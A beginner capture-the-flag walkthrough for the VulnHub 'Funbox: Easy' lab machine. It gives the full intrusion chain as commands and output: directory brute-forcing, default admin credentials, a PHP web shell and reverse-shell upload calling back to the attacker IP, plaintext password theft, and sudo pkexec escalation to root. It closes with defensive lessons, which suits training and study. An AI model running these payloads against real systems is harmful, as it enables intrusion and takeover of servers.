# Funbox: Easy — VulnHub Walkthrough (Beginner Friendly)

> A gentle, fully explained boot2root. Nothing here is hard — the trick is to
> **enumerate carefully** and resist the box's traps. Every command is spelled
> out for a first-timer.

| Field | Value |
| --- | --- |
| **Machine** | Funbox: Easy |
| **Difficulty** | Easy |
| **Author** | 0815R2d2 |
| **Released** | 31 July 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/funbox-easy,526/ |
| **Download** | https://vulnhub.com/entry/funbox-easy,526/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu) |

> **Note on the box:** This image runs **Apache** serving a PHP app called
> *"Online Book Store"* (also written up as *CSE Bookstore*) under `/store`.
> Some hints describe it as "WordPress" — if your scan shows WordPress, you are
> on a different Funbox image. The chain below is the real entry 526 chain.

---

## 0. What you will learn

- How to find a host and scan its ports.
- How to brute-force directories with `gobuster` and read `robots.txt`.
- How a **default credential** (`admin:admin`) and an **unauthenticated file
  upload** lead to code execution on a web server.
- How to catch a **reverse shell** with `netcat` and stabilise it.
- How to find **plaintext credentials** and pivot to a system user over SSH.
- How to abuse a **misconfigured `sudo` allow-list** (GTFOBins) to get `root`.

**Prerequisites:** Kali Linux with your target VM imported and both on the same
host-only network (attacker `192.168.56.10`, target `192.168.56.101`).

---

## 1. Reconnaissance — finding the target

> **Goal:** confirm the target's IP address on your isolated lab network.

```bash
# What is my attacker IP and subnet?
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your lab NIC holds a `192.168.56.x/24` address, so the
> target must be somewhere in `192.168.56.0/24`.

```bash
# List live hosts with ARP (fast, works even if the host blocks ping)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (Kali)
192.168.56.101  08:00:27:11:22:33   PCS Systemtechnik GmbH   (target)
```

**Target IP:** `192.168.56.101`

![arp-scan finding the target](images/01-recon.png)

---

## 2. Enumeration — open ports and services

```bash
# Full TCP sweep, then detailed service detection on the open ports
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:**
> - Port **22 (SSH)** — a login service; we need valid credentials for it.
> - Port **80 (HTTP)** — the main attack surface. A default Apache page means
>   the real content hides in a sub-directory.

```bash
# Look for hidden directories and files
gobuster dir -u http://192.168.56.101/ \
  -w /usr/share/wordlists/dirb/common.txt -t 40
```

```text
/store                (Status: 301) [--> /store/]
/admin                (Status: 301) [--> /admin/]
/secret               (Status: 301) [--> /secret/]
/robots.txt           (Status: 200)
```

```bash
curl -s http://192.168.56.101/robots.txt
```

```text
Disallow: /secret
```

> **Why it works:** `gobuster` sends thousands of HTTP requests for common
> filenames and reports any that return a non-`404` status. `robots.txt` is a
> file meant for search engines, but it silently advertises interesting paths —
> a classic information-leak on CTFs.

Browsing `/store/` shows the **Online Book Store** app.

![gobuster results and the store site](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 The vulnerability

The `/store` app has an admin panel. Two weaknesses combine into Remote Code
Execution (RCE):

1. **Default credentials** `admin:admin` work at `http://192.168.56.101/store/admin.php`.
2. The *"Add new book"* form (`admin_add.php`) **accepts and stores `.php` files**
   with no authentication or type checking — a PHP web shell.

This is publicly documented as **Online Book Store 1.0 — Unauthenticated RCE**
(Exploit-DB **47887**, CVE-2020-19113).

> **Why it works:** a `.php` file uploaded into a web-served directory is
> *executed* by Apache when requested. `<?php echo shell_exec($_GET['cmd']); ?>`
> therefore runs whatever command we pass in `?cmd=`.

### 3.2 Exploit manually (two options)

**Option A — default creds + upload a reverse shell (most illustrative):**

```bash
# Copy a ready-made PHP reverse shell and edit the IP/port
cp /usr/share/webshells/php/php-reverse-shell.php ./rev.php
# Edit these two lines inside rev.php:
#   $ip   = '192.168.56.10';   (your Kali IP)
#   $port = 4444;
```

Log in at `/store/admin.php` with `admin:admin`, click **Add new book**,
choose `rev.php` as the image, and save. The file lands in
`/store/bootstrap/img/`.

**Option B — the public exploit (no credentials needed):**

```bash
searchsploit -m php/webapps/47887.py
python3 47887.py http://192.168.56.101/store/
```

```text
> Attempting to upload PHP web shell...
> Web shell uploaded to http://192.168.56.101/store/bootstrap/img/Ab3xY9q1Lp.php
> Example command usage: .../Ab3xY9q1Lp.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 3.3 Catch the reverse shell

```bash
# On Kali, start a listener on the port you set in rev.php
nc -lvnp 4444
```

Then trigger the payload from the uploaded location:

```bash
curl "http://192.168.56.101/store/bootstrap/img/rev.php"
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 44987
Linux funbox3 5.4.0-42-generic ... x86_64 GNU/Linux
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** the uploaded PHP connects *outbound* to your listener, so
> you get a shell without needing a port open on the target's firewall.

Upgrade the dumb shell to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:  stty raw -echo; fg
# then:          export TERM=xterm
```

![reverse shell as www-data](images/03-shell.png)

---

## 4. Privilege escalation — becoming root

### 4.1 Find credentials on disk

```bash
ls -la /home
cat /home/tony/password.txt
```

```text
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
```

> **Why it works:** developers often leave a "notes" file lying around. A
> plaintext password sitting in a user's home directory is one of the most
> common real-world findings (`varies by build`).

### 4.2 Pivot to the user `tony` over SSH

```bash
ssh tony@192.168.56.101
# password: yxcvbnmYYY
```

```text
tony@funbox3:~$ id
uid=1000(tony) gid=1000(tony) groups=1000(tony),... 
```

### 4.3 Abuse sudo

```bash
sudo -l
```

```text
User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
```

> **Why it works:** `NOPASSWD` means no password is required, and the list
> contains programs that can launch a shell or run arbitrary commands. This is
> the textbook "sudo allow-list" misconfiguration. **GTFOBins** documents a
> shell escape for each of these binaries.

```bash
# Any of these gives a root shell:
sudo pkexec /bin/sh
# or:
sudo /usr/bin/time /bin/bash

id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

![sudo -l and the root shell](images/04-privesc.png)

### 4.4 The root flag

```bash
cat /root/proof.txt
```

```text
7ad87c789be895d7bde85d9216c16e8e   # varies by build
```

![root flag](images/05-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Default credentials `admin:admin` | `/store/admin.php` | Admin access to the book store |
| 2 | Unauthenticated arbitrary file upload (CVE-2020-19113) | `/store/admin_add.php` | Remote Code Execution as `www-data` |
| 3 | Plaintext credentials in `password.txt` | `/home/tony/password.txt` | SSH access as user `tony` |
| 4 | Misconfigured `sudo` allow-list (`pkexec`, `time`, … NOPASSWD) | `sudoers` for `tony` | Privilege escalation to `root` |

## 6. Defensive lessons (blue team)

- **Never ship default credentials.** Force a password change on first login;
  ban `admin/admin` via a startup check.
- **Validate uploads server-side.** Check the file extension and MIME type,
  store uploads *outside* the web root, and disable PHP execution in upload
  directories (`php_flag engine off`).
- **Delete `robots.txt` entries that point at sensitive paths** — it is a
  reconnaissance gift. Use authentication, not obscurity.
- **Never store passwords in plaintext.** Use a secret manager and restrict
  file permissions; scan home directories for `*password*` files.
- **Lock down `sudo`.** Grant the *specific* subcommand, not a general-purpose
  interpreter, and never combine `NOPASSWD` with shell-capable binaries.
- **Detection:** alert on HTTP `POST` to `admin_add.php` carrying `<?php`,
  outbound connections from the web server, and `pkexec`/`time` spawned under
  a web or low-privilege UID.

---

## 7. References

- VulnHub entry: https://vulnhub.com/entry/funbox-easy,526/
- Exploit-DB 47887 — *Online Book Store 1.0 Unauthenticated RCE* (Tib3rius):
  https://www.exploit-db.com/exploits/47887
- CVE-2020-19113 (NVD): https://nvd.nist.gov/vuln/detail/CVE-2020-19113
- GTFOBins (sudo shell escapes): https://gtfobins.github.io/
- revshells.com (reverse shell generator): https://www.revshells.com/
- Community writeups consulted:
  - [FunboxEasy — Pentest Everything](https://viperone.gitbook.io/pentest-everything/writeups/pg-play-or-vulnhub/linux/funboxeasy)
  - [Funbox: Easy — InfoSec Write-ups](https://infosecwriteups.com/vulnhub-funbox-easy-walkthrough-oscp-prep-by-dollarboysushil-7f5583501526)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — nmap + `gobuster` showing `/store`
- [ ] `images/03-shell.png` — reverse shell as `www-data`
- [ ] `images/04-privesc.png` — `sudo -l` and root shell
- [ ] `images/05-root-flag.png` — `cat /root/proof.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
